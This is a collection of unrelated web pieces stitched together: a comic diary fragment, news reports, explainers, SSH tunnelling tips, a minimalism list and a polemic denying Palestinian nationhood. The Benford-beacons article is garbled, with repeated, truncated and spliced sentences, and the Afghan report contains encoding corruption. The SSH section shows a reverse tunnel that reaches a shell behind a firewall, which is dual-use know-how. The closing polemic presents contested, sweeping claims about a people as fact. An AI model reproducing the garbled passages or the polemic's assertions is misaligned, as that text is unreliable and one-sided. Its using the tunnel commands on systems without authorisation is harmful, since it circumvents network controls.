Nothing makes you feel more alive than a brief downpour .
Actually it ’s raining quite heavily now .
It ’s teeming down .
It ’s teeming down , and one of my shoes is absolutely soaked .
This day just gets worse .
9:49 am – A kindly older lady in a black veiled hat sees me struggling with my soggy footwear and insists I get under her umbrella .
I thank her , stating that it ’s a shame that it is raining so heavily on such a sombre day .
She agrees and gives my arm a squeeze .
I ’m starting to feel a bit nervous now .
9:53 am – The old lady has walked me to a nice warm , dry church foyer – quite a few people have got the same idea to get in out of the cold .
I loudly proclaim this but everyone seems a bit fed up .
‘ Spose it is the Apocalypse .
Weirdly , everyone else had the same idea as me with the suited attire .
9:56 am – RESULT !
The Vicar showed up , I thought he was going to chuck us out but he ’s invited us all into the main church bit !
Hoping he ’ll let us have some wine .
Somewhere to sit , salvation , and Shiraz : the Holy Trinity .
These people I ’m with are well miserable though , no one seems excited about the wine and barely anyone is accepting my high fives .
9:59 am – Right , so I ’ve just realised that I ’ve gatecrashed a funeral .
This is really awkward because I wanted to get first dibs on the booze so I kind of elbowed my way to the front aisle – I can’t exactly just duck out quietly .
I did wonder why everyone else was crying – thought it was because there was only one bottle for us all to share !
10:02 am – I feel like people are starting to realise that I ’m not meant to be here .
Even the Vicar seems to be having a bit of a glower at me .
10:06 am – the deafening sound of Carly Rae Jepsen ’s Call Me Maybe echoes around the church and as I try to check my phone to read the text as I am frogmarched to the exit by two burly mourners .
It ’s her !
She ’s replied !
“ lol yeah i will miss u 2 when the world ends .
do u know were my good stapler is ? x ”
Good how she ’s putting a brave face on for all of this , I know she ’s clearly terrified .
I text her back .
10:15 am – I ’m now into my final hour .
I walk around town , not sure what to do with my time .
I check Facebook on my phone for a bit .
I see that Darren from Accounts has unfollowed me on Twitter #notevenbothered Darren
10:23 am – I ’m walking around town and there ’s people everywhere .
Probably Christmas shopping .
What ’s the point ?
We ’ll all be dead soon away …
I feel I ’m on the brink of an existential crisis .
Feel a bit weird .
Panicking slightly .
10:26 am – OK I ’m really nervous now .
I ’m actually breaking down .
Do n’t know if I can handle this .
I ’m ashamed to say that in my moment of fear I turn to an intoxicating sedative to take the edge off .
I order a Hot Chocolate with Amaretto in it .
Hold on tight …
10:38 am – I start to come around from my liquor - fueled manic episode .
Do n’t know where I am .
Seem to have my face buried in a fluffy white pillow .
It ’s quite comfy .
10:39 am – … It turns out that I was actually sat on Santa ’s lap in the shopping centre Grotto , crying into his beard .
Santa seems scared .
I quickly leave , grabbing a present on the way out .
10:43 am – On a big comedown now .
I see a young mother struggling with her shopping and a bored little boy dragging his feet .
I walk over and give him the present I took from Santa .
Mother thanks me , but as I walk away I hear the boy say “ this is n’t a Nintendo DSi ” despondently , sulking at the 100 - piece Jigsaw of The Yorkshire Dales .
10:47 am – As I walk home I try to calm down by singing the Louis Armstrong song .
I get as far as “ Red Roses too ” before someone shouts at me to “ shut the hole in my face . ”
10:55 am – I ’m home now .
I take one last look around the flat before draping my bedsheets over my kitchen table .
It might not be as sturdy as John ’s bunker , but I feel comforted as I crawl underneath .
10:58 am – In my linen fort of trepidation I await the end .
I try to relax with some music .
11:04 am – Not long now .
Wish I had a flask of that Amaretto Hot Chocolate .
11:08 am – THUD !
CRASH !
RACKET !
Oh God I think I just heard the door fly off the handles .
This is it .
I ’m terrified .
11:09 am – I close my eyes tight and hug my legs as all around me in the flat I hear banging , thudding , scraping , an awful din .
11:10 am – There ’s an appalling smell in the air .
I ’m not exactly sure what sulphur smells like , but if it ’s anything like dank , stale rum then I think that I ’m in the presence of evil right now …
11:11 am – I feel like I ’m seconds away .
My End of the World Spotify playlist cuts out – the internet is down .
This really is it .
The Apocalypse .
11:12 am – In the furore and fracas of my final moments I feel compelled to finish my letter to John .
John .
I hope you ’re OK .
I hope you get this .
I ’m in the eye of the storm right now and I ’m scared , John .
I ’m scared .
You were right .
You were right all along .
Millions may have scoffed at your claims and doubted you but I did not – I could never doubt my best friend !
I wish I was with you right now !
I ’m scared , John .
I hope you have a nice life .
Please love every minute of it because it is so precious .
I love you .
11:15 am – All is quiet .
I dare n’t open my eyes .
Adrenalin is pumping through my body – I ca n’t tell if I ’m hurt or not .
I do n’t think I am .
Yet …?
11:17 am – The silence is even worse than the crashing and banging .
I just wish it would happen now .
I ’m ready .
11:19 am – I am startled by the shrill opening notes of Call Me Maybe .
My eyes open .
Through my blurred vision I see my phone flashing bright .
This is unexpected .
I look at my phone .
Katie has texted back again .
“ found my stapler lol .
hahah ur m8 john must feel like a bit of a twit . ”
What on earth … ?
11:20 am – I slowly re-emerge from my cushiony castle under the kitchen table .
I ’m totally confused .
The flat looks like it ’s been absolutely trashed .
Ransacked .
The front door looks like it ’s been kicked in , the DVD player is missing and there ’s a goat trotting about in the hallway .
Weird .
11:21 am – I walk to the window and look outside .
The rain has eased off and the traffic is whizzing around below as normal .
I ’m hyperventilating .
I start to smile .
I start to laugh .
I ’m cackling maniacally .
I ’m alive !
I ’m alive !
I ’m alive !
11:23 am – After dancing around by myself , dancing around with the goat and attempting to dance with a very hungover and irritable Roddick , I sit in my living room with a cup of tea .
Even though it was n’t actually the end of the world , for a moment there I really believed that it was , and now I really appreciate how valuable life is and how little time we all have on the planet .
I laugh gleefully at having a free afternoon , just me and the world , this beautiful planet .
Me and Mother Nature .
11:24 am – I put the Xbox on .
But first , to finish my letter to John I Kentucky …
All that stuff about you being my best mate ?
Forget it .
All of that build - up and NOTHING HAPPENED .
You ’re a fibbing sod , you John .

In many countries today , quite a lot is being said about harnessing renewable energy technologies – particularly in light of the rising oil prices .
But some people might still be wondering exactly what renewable energy is .
Renewable energy is power which has been generated from renewable resources – in other words , it does not “ run out ” or eventually become depleted .
It can be continuously re-created .
It ’s not just the prices of oil that has people searching for clean and renewable energy sources .
Global warming concerns , and international pollution problems , have triggered this concern as well .
Governments around the world have begun to support research on improving the renewable energy technologies .
Currently , the five common renewable energy sources are biomass , hydropower , geothermal heat , wind , and solar power .
Biomass
Biomass consists of organic material which has been produced by animals and plants .
Biomass energy uses stored energy from the sun .
This is a result of the natural process which any plant uses to survive – photosynthesis .
Because we can always grow new crops and trees , biomass is considered a form of renewable energy .
Furthermore , organic waste can be used to create biomass as well .
Some commonly used biomass fuels include crops , wood , garbage , and manure .
When these materials are burned , they emit heat which produces steam , that can in turn be used to create electricity .
Some biomasses are converted into other usable energy forms , such as methane gas or biodiesel .
Hydropower
Hydropower is one of the oldest forms of renewable energy .
It was used in ancient times to grind grain .
Coal was once the only source of power in the United States .
But in 1880 , the first Hydropower plant was built , and since then , more of these have been erected in order to provide the people with electricity .
Geothermal Energy
Geothermal Energy comes from within the Earth itself .
The steam or heat which comes from the center of the earth can be used to regulate the temperatures of buildings , and to generate electricity as well .
This is considered one form of renewable energy because water can always be replenished by rain , and because the earth ’s core maintains its temperature .
Wind Power
Even the ever - present wind can provide a renewable energy source .
Wind is created because the uneven heating on the earth ’s surface causes the air to move .
Thus , wind power is essentially a bi-product of solar power .
Wind propellers are used to collect the wind ’s kinetic energy , which turns turbines that are in turn used to create electricity .
Solar Power
This form of renewable energy will be available as long as the sun shines .
Solar energy can either be used as thermal energy , or it can be converted into electricity .
As a thermal energy , it can be used to heat water or spaces .
Through the use of solar cells or similar photovoltaic devices , it can be used to create electricity .
The heat of the sun can also be used to create steam , which turns turbines and thus produces electricity .
The last couple of days have been an Old Spice explosion , as one of the most popular viral campaigns in recent history — in which the Old Spice Guy made personalized videos for fans , randoms and prominent bloggers alike — has taken over the social media realm .
But how popular was it really ?
Visible Measures has some nifty numbers for us .
First , here 's the basics :
Number of videos made : 180 +
Number of video views : 5.9 million
Number of comments : 22,500
And that 's since Tuesday .
The campaign , which stars The Most Interesting Man in the World 2.0 Isaiah Mustafa , launched in February centered around the theme " The Man Your Man Could Smell Like . "
The original ad attracted 19 million views to date across all platforms ( not just the below YouTube clip ) .
Next came " The Return of The Man Your Man Could Smell Like , " which premiered a few weeks ago and has already garnered 6.9 million views .
As you can see , the campaign has only continued to grow in popularity — likely due to increased press / brand recognition .
According to Visible Measures , " Old Spice Responses " — a.k. a the string of custom - made vids — is one of the fastest - growing online video campaigns of all time .
The company compares the endeavor to some of the most popular viral videos to date below , and how they 've grown over the course of 24 hours ( to be fair , " Old Spice Responses " had a time limit attached , so there was more urgency to participate with this particular string of videos than there was to get in on , say , the Susan Boyle craze ) .
Using Viewers to Go Viral
What 's genius about this endeavor is how Old Spice and marketing agency Wieden +
Kennedy have used viewers to go viral .
Yesterday , I was chatting with Dan Greenberg of Sharethrough — a company that seeds viral videos for brands — about the campaign , and he pointed out that , " Brands do n't make viral videos , users make videos viral . "
That 's exactly what Old Spice achieved , rather handily .
Read Write
Web has an excellent piece on how exactly this campaign worked , explaining how a team of " tech geeks , marketers and writers " gathered together and tapped everything from Facebook and Twitter to Reddit and 4 chan ( yes , 4 chan — they went there ) to make this thing go global .
As I pointed out on Tuesday and Stan Schroeder opined this a.m. , this campaign worked so well because it spoke directly to you .
A New Kind of Viral Video ?
" In a way there 's nothing magical that we 've done here , " Wieden + Kennedy 's Global Interactive Creative Director Iain Tait , told RWW .
" We just brought a character to life using the social channels we all [ social media geeks ] use every day .
But we 've also taken a loved character and created new episodic content in real time . "
And that might be the most interesting part of the whole deal — how overwhelmingly positive it is .
Let 's face it , most viral videos are shocking , disturbing and / mocking of their subject ( as much as I adore " Double Rainbow , " it is , well , kind of mean ) .
There 's none of that here .
Instead of trying to trick folks into sharing content by creating something shocking or over - the - top ( which would impel one to pass it along via the " WTF !? " sentiment ) or coasting along on an established viral meme and attaching a product to it ( as folks have done with Chatroulette and flash mobs ) , Old Spice first created a character that people — shock , shock , horror , horror — liked , and then created an immersive experience that people wanted to be a part of .
Congrats , Old Spice .
You 've set the precedent .
Now ready yourself for the deluge of less successful copycats .
A Royal Marine and his father have been stabbed on their doorstep as they tried to stop a group attacking a female family member in south London .
Matthew Stevenson - Webber , 24 , was stabbed in the back trying to protect his sister in Mitcham on Tuesday night .
He is in a stable condition .
His father Craig Joseph - Webber , 45 , was stabbed in the head and is in a critical but stable condition .
A police spokesman said five teenagers , aged 17 to 19 , had been arrested
A third man , aged , 30 was stabbed in the shoulder and is also in a stable condition in hospital .
Heard screaming
The family of the marine had contacted their MEP Nirj Deva on Wednesday about the incident .
A spokesman for his office said the men had heard screaming outside their home and went to help their relative .
They were then attacked by the group .
A Metropolitan Police spokesman said officers had been called to an altercation involving a group of youths in Belgrave Road at 2320 BST .
He said three men , aged 24 , 30 and 45 , were found suffering stab wounds and taken to hospital .
Five males , three aged 19 , one aged 18 , and a 17 - year - old , have been arrested and remain in custody at a south London police station .
You already might have heard that it costs the United States $ 1 million for each solider per year in Afghanistan , to cover the cost of the soldiers ’ benefits , troop transports and other material .
What you might not have heard is that your hard earned taxpayer dollars are also being used to buy well - connected Afghans posh villas in Dubai .
Der Spiegel remarks curtly , “ Amid concerns that the money could be the result of corruption , American politicians have temporarily cut off aid to the Afghan government . ”
The German daily adds :
ADVERTISEMENT
… Huge amounts of money [ are ] regularly being secreted out of Afghanistan by plane in boxes and suitcases .
According to some estimates , since 2007 , at least $ 3 billion ( Ã¢â€ š Â ¬ 2.4 billion ) in cash has left the country in this way .
The preferred destination for these funds is Dubai , the tax haven in the Persian Gulf .
And , given the fact that Afghanistan ’s total GDP amounts to the equivalent of $ 13.5 billion , there is no way that the funds involved in this exodus are merely the proceeds of legal business transactions …
It is clear that much more money is making its way out of Afghanistan through Kabul ’s airport than is being officially declared and logged .
For example , important politicians and businesspeople can often board planes from the airport ’s special VIP area without being searched .
And if customs officials do conduct a search and find a suitcase stuffed with millions of dollars in cash , people with powerful connections often step in to make sure that the luggage makes it out of the country with its owner — no questions asked .
“ A couple phone calls are made , ” General Jabarkhel says with frustration in his voice , “ and the person can carry on . ”
To where does this generous US foreign aid travel ?
A number of Afghan businesspeople have purchased expensive villas in Dubai , once only attractive as a golfer ’s paradise .
These include a brother and a cousin of Afghan President Hamid Karzai , one of Karzai ’s former vice presidents and the brother of Mohammad Qasim Fahim , one of the country ’s two current vice presidents .
Asking prices for the stylish , Roman - style houses built along the beaches of the man-made island Palm Jumeirah , for example , start at $ 2 million .
Until just a few years ago , many of their current inhabitants were far from wealthy .
As the Washington Post has discovered , these properties are often only registered under the names of the individuals issuing the loans , such as Sherkhan Farnood , the founder and chairman of Kabul Bank , Afghanistan ’s largest private bank , who was also a key supporter of President Karzai during his 2009 re-election campaign .
Like many of his clients , Farnood now spends the majority of his time in Dubai .
And among the 16 shareholders in his bank are Mahmoud Karzai , the president ’s business - minded older brother , and Haseen Fahim , the brother of Afghan Vice President Mohammad Qasim Fahim .
Most financial transactions in Afghanistan continue to be conducted through so - called “ hawalas , ” traditional Islamic money - transferring outfits based more on honor and good faith than receipts , a fact that makes it more or less impossible for Western corruption investigators to trace the flow of money .
US taxpayers are also footing an enormous bill for the Pentagon ’s use of fuel in the landlocked nation .
In 2008 , the price of gasoline in the United States topped the $ 4 per gallon mark .
This year in Afghanistan , the price has topped $ 400 .

The stunning revelation emerged in October 2009 in a report from the Pentagon to House officials .
The information conveyed offers new insight into a recent report by the Congressional Research Service , which found that the US spends $ 1 million per year for each servicemember on the ground in Afghanistan .
Why so much ?
The cost includes shipping , which sometimes includes the pricetag of a helicopter flight .
Sending fuel by helicopter is woefully inefficient , because it uses up almost as much fuel as it carries .
The latest Nielsen poll in Fairfax newspapers shows Labor has an election - winning lead over the Coalition .
The poll has the Government leading the Opposition by 8 points on a two - party preferred basis , at 54 per cent to 46 per cent .
On the primary vote , Labor has nudged ahead to 42 per cent , while the Coalition is on 41 per cent .
The poll found Ms Gillard has a clear lead over Mr Abbott as preferred prime minister .
There is also a strong view that if Ms Gillard wins , she should make Kevin Rudd foreign affairs minister .
The poll finds 68 per cent of people say she should give him the job .
That is around the same number that say they are disappointed with the way he was dumped as prime minister .
While the Neilsen figures are strong for Labor nationally , they show it is trailing by eight points in Queensland and Western Australia .
The Coalition could win up to 10 seats in Queensland on those figures .
Women favour Gillard
Meanwhile , another poll for The West Australian reveals Julia Gillard 's popularity with WA women may cost the Coalition a marginal seat in the upcoming election .
Tony Abbott has been campaigning heavily in the resource - rich state , hoping unease over the Government 's mining tax could result in a flow of votes to the Coalition .
But Westpoll of four key seats shows the resolution of the mining stoush has helped the Government shore up votes in its most marginal seat of Hasluck .
The poll has the Coalition tracking better than the Labor Party on the mining tax but not convincingly , a sign the compromise had achieved the Government 's goal of easing the electorate 's fears over the tax .
The poll surveyed 1,650 voters in the seats of Canning , Hasluck , Cowan and Swan and also found female voters were more likely to vote Labor in the seat of Canning , currently held by the Liberals ' Don Randall .
If the figures were to be borne out at the election , it would result in a narrow win for former WA state minister Alannah MacTiernan .
Ms Gillard has consistently polled strongly with female voters since coming to power .
However the poll also showed the Liberals are likely to hang onto the seat of Swan , contradicting the perception that last year 's redistribution
The poll also has Cowan being returned to the Liberals .
Tony Abbott is expected to continue his attack on the mining tax at today 's West Australian Liberal State Conference .
Julia Gillard is spending the day campaigning in Brisbane .
What will happen if you combine footwear or accessories with food ?
It will be not only stylish , but tasty collection .
And if you can not imagine how it will look like , then you simply have n’t seen works of photographer Fulvio Bonavia .
In 2008 Fulvio published his book " A Matter of Taste " with the conceptual photos on the theme " Food as Fashion " .
The most improbable that all the tasty accessories of Fulvio Bonavia – are real !
Author by his own hands made models from food for each shot .
Unfortunately , all his creations were too short - lived .
But it was nice to know that the items captured in photos are the work of human hands , not of the ubiquitous Photoshop .
The idea of the author is : “ If you do not want to eat it – wear it ! ” Pictures excite taste buds and sense of style .

A new theory has been put forward in the astrophysics world suggesting people have assumed too much when looking for alien attempts to communicate with Earth .
The “ This approach is more like Twitter and less like War and Peace . ”
James is a physicist as well as the founder and president of Microwave Sciences Inc. in Lafayette , California .
Dominic is a scientist with NASA , and Gregory is an astrophysicist with the University of California Irvine .
The new hypothesis is based on an old adage .
Gregory explained “ Our grandfather used to say , ‘ Talk is cheap , but whiskey costs money . ’
Whatever the life form , evolution selects for economy of resources .
Broadcasting is expensive , and transmitting signals across light - years would require considerable resources . ”
" Assuming that an alien civilization would strive to optimize costs , limit waste and make its signaling technology more efficient , ... these signals would not be continuously blasted out in all directions but rather would be pulsed , narrowly directed and broadband in the 1 - to - 10 - gigahertz range . "
James summarized their hypotheses and findings during an interview with " If ET was building cost - effective beacons , would our searches have detected them ?
The answer turns out to be no .
Societies are always constrained by their resources .
Why did cathedrals take centuries to build ?
Partly because they had only so many artisans , but also their capital was limited . "
James explained the hypothesis to the New Scientist " Short pulses rather than a continuous signal would also enable frugal aliens to use small and cheap transmitters .
Small transmitters can beam out powerful radiation using high voltages – but only if they broadcast brief pulses that do n't give the electric fields time to discharge .
They would n't want to target individual stars : there are far too many of them .
Instead , they 'd build a powerful beacon , then swing that beacon around and repeat it .
Astronomers have seen some unexplained signals that lasted for tens of seconds then were never seen again .
Some of those could have been extraterrestrial beacons but there was n't enough observing time to wait for any repeats . "
The Benfords suggest SETI should point its receiver dishes towards the center of the milky way because the stars are denser there .
Gregory said “ The stars there are a billion years older than our sun , which suggests a greater possibility of contact with an advanced civilization than does pointing SETI receivers outward to the newer and less crowded edge of our galaxy . "
The short pulse approach to communications has cottoned on quickly , with science writers calling the theory Benford beacons .
The hypothesis has also meant that many are speculating that the Gregory said “ Will searching for distant messages work ?
Is there intelligent life out there ?
The SETI effort is worth continuing , but our common - sense beacons approach seems more likely to answer those questions . ”
The real answer , of course , will be revealed as scientists test the hypothesis .
The Benford 's theory has been endorsed by other scientists .
The trio's hypotheses were written up in two papers , Searching for Cost - Optimized Interstellar Beaconsand Messaging with Cost - Optimized Interstellar Beacons , both of which were published in The theory , proposed by James Benford , his son , Dominic Benford , and Jame 's twin brother Gregory Benford , published in two papers in June , have generated a great deal of excitement in the science world .
The Benfords looked at the issue of communications and concluded that aliens , much like humans , would want to economize their resources where possible , and thus they would not send out communications resembling what scientists have expected would be sent .
Instead , the scientists suggest , aliens might be as frugal with expensive resources as humans are .
The University of California Irvine said extraterrestrials might have been trying to contact Earth all along , but because scientists were looking for something different , the messages were missed .
The trio of scientists believe extraterrestrials might send out short messages , or pulses .
James explained , sayingJames is a physicist as well as the founder and president of Microwave Sciences Inc. in Lafayette , California .
Dominic is a scientist with NASA , and Gregory is an astrophysicist with the University of California Irvine .
The new hypothesis is based on an old adage .
Gregory explained SETI ( Search for Extraterrestrial Intelligence ) has been searching for extraterrestrials for the past fifty years , trolling for signals from space with arrays of satellite dishes .

This article briefly traces the history of tax sheltering in the latter half of the twentieth century in the United States , including the transformation of the role of tax professionals from support functions in tax planning for transactional efficiency to profit center functions through aggressive tax structuring .
The article addresses general anti-avoidance rules as evidence of the prevalence of intensive outside the United States and works in greater detail with Swedish and German aggressive tax planning .
The article argues that over the past half century or longer , multiple factors have contributed to and fused into a culture of tax avoidance .
Congress and other legislatures have fueled and continue to fuel the growth of that tax avoidance culture by relying on the taxation system to deliver a variety of tax unrelated subsidies and economic stimuli and , in some cases , to drive social policy .
That reliance confuses taxpayers concerning the function of taxation , the nature and importance of governmental services , and taxpayers ’ own tax compliance obligations .
In the presence of that culture , legislatures and national executives lack the political will to adopt those proposals that actually might minimize or even eliminate the tax avoidance problem .
Rather the legislatures and executives settle on political compromises that have their own flaws and produce only limited corrective results , like general anti-avoidance rules as an example .
The article concludes that the cultural change essential to provide the political resolve to quell tax avoidance includes suppressing collateral , non-revenue collection uses of the taxation system like delivering subsidies and economic stimuli or driving social policy .
To bring about cultural change a substantial increase in enforcement is critical as is a massive education effort to overcome ever growing anti-tax rhetoric .
My wife found an amazing story on Yahoo.com , about a man who decided he wanted to escape from the “ rat race ” of normal life .
So he decided to build a house for himself that would only contain the essentials .
He ended up building an 89 - square - foot home that includes everything that he needs to enjoy his life .
He pays less than $ 100 PER YEAR in utilities , and has no mortgage or rent .
I guess he does n’t have to think about how to yard sale either 😉 .
You can view the full video of his story below :
What I love the most from this story is that he was able to make a business out of it !
I ’m sure that was n’t his goal when he set out , but apparently there is a large enough demand for this type of living .
I guess there are a lot of people who do not want to worry about buying a home ever again !
I wonder how well he would get along with the man who is eating well for $ 1 / day ?
So , could you live in his home ?
What would you miss about your current living conditions ?
Do you think he ’s crazy ?
Are you planning on contacting him for a quote ?
I look forward to your comments below .

Before there were VPNs , there was ssh .
And when you do n’t have access to your VPN or ca n’t set one up , you can still get most of the functionality over ssh .
Quick and dirty HTTP tunneling
This is useful if you need to hit an internal server through a proxy server :
ssh -f -N -L 31609:hostireallywanttogetto.com:80 proxyhost.com
and then load http://localhost:31609 in your browser and it will look like http://hostireallywanttogetto.com from proxyhost.com ’s point of view .
Similarly :
ssh -f -N -L 31610:securehost.com:443 proxyhost.com
will forward SSL traffic to https://localhost:31610/.
Not gonna work completely , but it ’s a quick and dirty solution I ’ve used to get to internal wiki servers before .
Quicker and Dirtier SSH tunneling
This is n’t very different from ssh'ing into one box and immediately ssh'ing to another .
It avoids an extra bash process and it ’s quicker , but that ’s really it – except for the BAMF factor :
ssh -t gatewaymachine.com ssh hostireallywanttogetto
Reverse SSH tunneling a shell
Got a computer behind a firewall whose configuration you do n’t have access to ?
It ’s pretty easy to get the computer behind the firewall to poke out to another server .
( step 1 , from the computer you wish to access )
derwiki@firewalledcomputer :~$ ssh - R localhost :2002:localhost:22 mypublicserver.com
( step 2 , from any computer than can access mypublicserver.com )
derwiki@mylaptopontheinternet :~$ ssh mypublicserver.com -p 2002
( authenticate )
derwiki@firewalledcomputer : ~$
I ’ve found this especially useful to get into my dad ’s computer and fix things .
I put the “ ssh - R ” command into a shell script called “ letadamin ” , made it executable , and put it on his desktop .
Now it ’s super easy for him to grant me access in .
Tunneling SCP through a gateway
Sometimes you want to file transfer through a gateway machine :
ssh -N -L 1234:targetmachine:22 mypublicserver.com
scp -P 1234 localhost:~/remotefile localfile
Quickly setting up passwordless SSH
First make sure you ’ve generated a key file : ssh - keygen
Ubuntu ( and other Linux distros ) make it really easy : ssh - copy - id user@remotehost
OS X seems to lack this , so the quick one liner I have is :
cat ~/.ssh/id_dsa.pub | ssh username@myslicehostserver.com “ cat - >> ~/.ssh/authorized_keys ”
These are the most frequent ssh commands that I ’ve “ discovered . ”
What ’s your favorite thing to do with ssh that I ’ve missed ?
Thanks to Lann and Shivaram for helping me come up with this list
Update : some people have contributed some great ssh tips on Hacker News
Phoenix , Arizona ( CNN ) --
A legal battle over a tough Arizona immigration law appeared certain after a federal judge granted a preliminary injunction Wednesday that blocked the most controversial parts of the law a day before it was to take effect .
The injunction means that , at least for now , police are prevented from questioning people 's immigration status if there is reason to believe they are in the country illegally .
U.S. District Judge Susan Bolton also blocked provisions of the law making it a crime to fail to apply for or carry alien registration papers or " for an unauthorized alien to solicit , apply for , or perform work , " and a provision " authorizing the warrantless arrest of a person " if there is reason to believe that person might be subject to deportation .
Arizona Gov. Jan Brewer said the state would file an expedited appeal to the 9th Circuit Court of Appeals , signaling a legal escalation that some expect will end up before the U.S. Supreme Court .
Other parts of the law will go into effect Thursday as passed .
This includes a ban on so - called sanctuary cities , and the criminalization of hiring day laborers who are in the country illegally .
The parts of the law dealing with sanctions for employers who hire illegal immigrants also withstood the first legal test .
CNN senior analyst Jeffrey Toobin said the ruling reflects the government 's argument that immigration enforcement should be dealt with at the federal level .
" Arizona may have good intentions , they may be trying to make up for where the U.S. government has failed , but what the judge is saying is , this is not the way to do it .
" I think this a case very much destined for the Supreme Court , " as other states pass similar laws , Toobin said .
Seven lawsuits , including one filed by the Department of Justice , are seeking to block implementation of the law , signed by Brewer in April .
Arizona state Sen. Russell Pearce , author of the law , said he foresaw a protracted legal fight from the beginning .
" I wrote it to go to the supreme court , " he said before the ruling came down .
" I 'm begging for that fistfight at the Supreme Court .
We will win in a 5 - 4 decision and finally settle this problem . "
He added , " My message to the judge is uphold the Constitution .
Uphold state 's rights .
This is a battle of epic proportions .
This is the states versus the central government . "
The Court of Appeals could take up the case in a matter of days , but the earliest the Supreme Court could look at it would be October , because the high court is in summer recess .
Brewer said that she was disappointed by the ruling .
" This fight is far from over .
In fact , it is just the beginning , and at the end of what is certain to be a long legal struggle , Arizona will prevail in its right to protect our citizens , " she said in a statement .
" I am deeply grateful for the overwhelming support we have received from across our nation in our efforts to defend against the failures of the federal government . "
She emphasized that Wednesday 's action was a temporary injunction and that many other parts of the bill will go into effect as planned .
Another supporter of the law , Maricopa County Sheriff Joe Arpaio , said that he and his crusade against illegal immigration will not be deterred .
" I am not really disappointed about the judges decision , " Arpaio said .
" I know what my policies are , and we are going to continue doing what we have been doing . "
The Center for Immigration Studies , which advocates immigration reduction , was disappointed but not surprised by the ruling , said Executive Director Mark Krikorian .
" If the opponents had n't turned it into this bogeyman , it would have been a useful , if modest , tool for the police , " Krikorian said .
He argues that the Arizona law was n't intended to usurp federal authority .
" Arizona does not have its own immigration policy , even with the law .
They are buttressing federal law , " Krikorian said .
Arizona Sens. John McCain and Jon Kyl , both Republicans , also came out against the ruling .
" Instead of wasting taxpayer resources filing a lawsuit against Arizona and complaining that the law would be burdensome , the Obama Administration should have focused its efforts on working with Congress to provide the necessary resources to support the state in its efforts to act where the Federal government has failed to take responsibility , " they said in a joint statement .
The Justice Department issued a statement saying the court " ruled correctly . "
" While we understand the frustration of Arizonans with the broken immigration system , a patchwork of state and local policies would seriously disrupt federal immigration enforcement and would ultimately be counterproductive , " the statement said .
" States can and do play a role in cooperating with the federal government in its enforcement of the immigration laws , but they must do so within our constitutional framework . "
While officials and their staff issued statements , a small group of activists in Phoenix expressed how they felt about Arizona 's law in a traffic - stopping way .
Four protesters wearing hard hats and work boots climbed a crane high above the streets of downtown Phoenix and unfurled a banner that read " Stop Hate . "
The banner also had a black mark through the number 1070 .
That was the number assigned to the immigration measure when it was introduced in Arizona 's legislature as a bill .
Capt .
Scott Walker with the Phoenix Fire Department called the four protesters experienced climbers and said they would be arrested when they came down .
Reaction to Wednesday 's ruling on the Arizona law was not limited to the United States .
Applause erupted at a protest outside the U.S. Embassy in Mexico City when a speaker announced the judge 's decision .
" I think it is a big victory , and it is the start of many more , " said Sergio de Alba , president of the National Confederation of Workers and Farmers Organizations .
Minutes earlier , he had called on Mexicans to boycott products from the United States in protest .
Protesters attached signs to a gate in front of the Embassy , with one slogan saying , " Boycott Against Arizona - Nazizona , home of hunting migrants and the Ku Klux Klan . "
Opponents say the law will lead to racial profiling , which is illegal .
The government 's lawsuit , however , did n't use that rationale in it 's lawsuit .
It argued that Arizona was usurping a federal authority .
Supporters point out that the law prohibits racial profiling and that people cannot be stopped and asked for proof of legal residence based solely on their looks .

Will you be playing for just CJ in SC2 or is there a possibility that you may join another team ?
If CJ switches to SC2 do you think you may be expected to help coach some ?
I would think that you would have much more knowledge then anyone else in the house .
Do you think infestor / zerglings is a viable strategy or has its success just been because people are unprepared for it ?
In Huks recent interview with TheElitists he was pretty annoyed about the comments you made in the Nerds of the Round Table video .

Life can be ridiculously complicated , if you let it .
I suggest we simplify .
Thich Nhat Hanh ’s quote , which I ’ve stolen as this site ’s subtitle , is the shortest guide to life you ’ll ever need :
“ Smile , breathe , and go slowly . ”
If you live your life by those five words , you ’ll do pretty well .
For those who need a little more guidance , I ’ve distilled the lessons I ’ve learned ( so far ) into a few guidelines , or reminders , really .
And as always , these rules are meant to be broken .
Life would n’t be any fun if they were n’t .
the brief guide
less TV , more reading
less shopping , more outdoors
less clutter , more space
less rush , more slowness
less consuming , more creating
less junk , more real food
less busywork , more impact
less driving , more walking
less noise , more solitude
less focus on the future , more on the present
less work , more play
less worry , more smiles

Efforts to impose a Palestinian state ( the " two - state " proposal ) are doomed to fail for one simple reason : Palestinians Arabs do not want such a state ; they do n't constitute a nation , or a people .
Their nationalism is not based on a unique linguistic , historical , cultural , or religious identity ; its primary goal is to wipe out the State of Israel and its Jewish inhabitants .
Any form of " Palestinian " statehood , therefore , that accepts Israel 's right to exist , is , by their definition , impossible .
That is clearly evident in the PLO Covenant and Hamas Charter .
American Promise Obama to Abbas : Working towards Palestinian state Roi Kais Palestinian news agency WAFA says US president telephoned Palestinian leader , briefed him on meeting with Prime Minister Netanyahu .
According to Abbas ' spokesman , Obama vowed to exert every effort to help establish independent state Obama to Abbas : Working towards Palestinian state
‘ Palestinianism ’ is not a national identity , but a political construct developed as part of a terrorist agenda when the PLO was formed in 1964 .
It was a way of distinguishing between Arabs and Jews , and between Arabs who lived in Israel before 1948 and other Arabs .
" Palestinian Arabs , " or " Arab Palestinians " is not a foreign or colonial description ; it is what they used to describe themselves in their official documents .
Their identity was based on a myth ; their sole purpose was " the liberation of Palestine , " including what is now Jordan .
Arabs who lived in Palestine did not consider themselves separate from the greater Arab nation , as reflected in PLO documents .
They rallied to the pro-Nazi Mufti , Haj Amin Hussein , not because he expressed their national identity , but because of Jew - hatred .
Nor do they define their struggle as achieving statehood alongside Israel .
Their goal is to replace Israel .
" Two - state " proposals , therefore , with Palestinian statehood as a territorial goal , in fact contradict Palestinianism .
Such plans mean the end of Palestinianism , and of their struggle to eradicate Israel .
Statehood means ending armed struggle
This explains why no Arab " Palestinian " leader will agree to surrender to Western and Zionist interests , and why making compromises is anathema .
Statehood means a denial of the Nakba ( catastrophe ) , the establishment of the State of Israel in 1948 , admitting that everything for which they fought and sacrificed was in vain .
Statehood means abandoning five million Arabs who live in 58 UNRWA - sponsored " refugee camps " in Judea , Samaria , Gaza , Lebanon , Syria and Jordan , and hundreds of thousands living throughout the world ; they will no longer be considered " refugees . "
That means a loss of over half - billion dollars per year that UNRWA receives .
Statehood means giving up " the armed struggle , " the crux of their identity ; it means that the concept of Palestinianism created by the PLO , accepted by the UN and the media , and even Israeli politicians was a hoax , a fake identity , with a false purpose .
It means that their suffering was for naught .
Statehood means taking responsibility and ending incitement and violence .
